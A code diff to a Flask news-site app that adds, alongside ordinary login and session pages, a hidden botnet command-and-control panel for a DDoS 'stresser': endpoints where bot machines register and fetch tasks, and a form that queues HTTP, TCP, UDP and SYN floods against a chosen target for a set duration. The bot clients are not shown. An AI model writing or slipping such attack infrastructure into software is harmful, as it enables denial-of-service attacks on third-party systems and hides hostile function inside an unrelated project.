@@ -9,6 +9,7 @@ from forms.news import NewsForm
 from flask_login import LoginManager, login_user, login_required, logout_user
 from flask_login import current_user
 import datetime
+import json, threading, time, socket, random
 
 
 app = Flask(__name__)
@@ -169,6 +170,113 @@ def session_test():
     session['visits_count'] = visits_count + 1
     return make_response(
         f"Вы пришли на эту страницу {visits_count + 1} раз")
+
+
+bots = []
+tasks = {}
+
+methods = {
+    "HTTP":"l7",
+    "TCP":"l4",
+    "UDP":"l4",
+    "SYN":"l4",
+    "HTTP-RAW":"l7"
+}
+
+
+def sleep(times):
+    for i in range(times):
+        time.sleep(1)
+        yield i
+
+
+def isForm(form, key):
+    try: return form[key]
+    except: return False
+
+
+def check(time, key):
+    iss = True
+    for i in sleep(int(time)):
+        if isForm(tasks, key) == False:
+            iss = False
+            break
+    if iss: tasks.pop(key)
+
+
+@app.route("/stresser")
+def stresser():
+    db_sess = db_session.create_session()
+    if current_user.is_authenticated:
+        target = ""
+        if len(list(tasks.keys())) != 0: target = "TARGET:"
+        return render_template("target.html", count=str(len(bots)), target=target, tasks=list(tasks.values()))
+    else:
+        return redirect("/login")
+
+
+@app.route("/RegistrBot")
+def RegistrBot():
+    if (request.remote_addr in bots) != True:
+        bots.append(request.remote_addr)
+    return ""
+
+
+@app.route("/GetTask")
+def getTask():
+    if (request.remote_addr in bots) != True:
+        bots.append(request.remote_addr)
+    return json.dumps(tasks)
+
+
+@app.route("/AddTask", methods=["POST"])
+def addTask():
+    if "user" in session:
+        Err, form = [], request.form
+        forms = {"target": "Пустое поле Target.", "method": "Пустое поле Method.", "timess": "Пустое поле Time."}
+        for i in list(forms.keys()):
+            stats = isForm(form, i)
+            if stats == False: Err.append(forms[i])
+            if stats != False and form[i] == "": Err.append(forms[i])
+            if stats != False and methods[form["method"]] == "l4" and (
+                    ("https://" or "http://") in form["target"]) != False:
+                Err.append("Этот Target для L7")
+            if stats != False and methods[form["method"]] == "l4":
+                try:
+                    print(32243)
+                    addr, port = form["target"].split(":")[0], int(form["target"].split(":")[1])
+                    socket.inet_aton(addr)
+                except:
+                    Err.append("Неверная цель")
+                try:
+                    int(form["timess"])
+                except:
+                    Err.append("Неверно указано поле Time")
+
+        try:
+            assert form["method"] in list(methods.keys())
+        except:
+            Err.append("Метода не существует")
+
+        if len(Err) != 0:
+            return f"{Err[0]}<br><br><a href=\"/home\">Назад</a>"
+        else:
+            key = str(random.getrandbits(30))
+            tasks[key] = {"status": "_", "target": form["target"], "time": form["timess"],
+                          "type": form["method"].lower(), "id": key}
+            threading.Thread(target=check, args=(form["timess"], key)).start()
+            return redirect("/home")
+    else:
+        return redirect("/login")
+
+
+@app.route("/DelTask/<string:targets>")
+def delTask(targets):
+    try:
+        tasks.pop(targets)
+    except:
+        pass
+    return redirect("/home")
 
 
 def main():
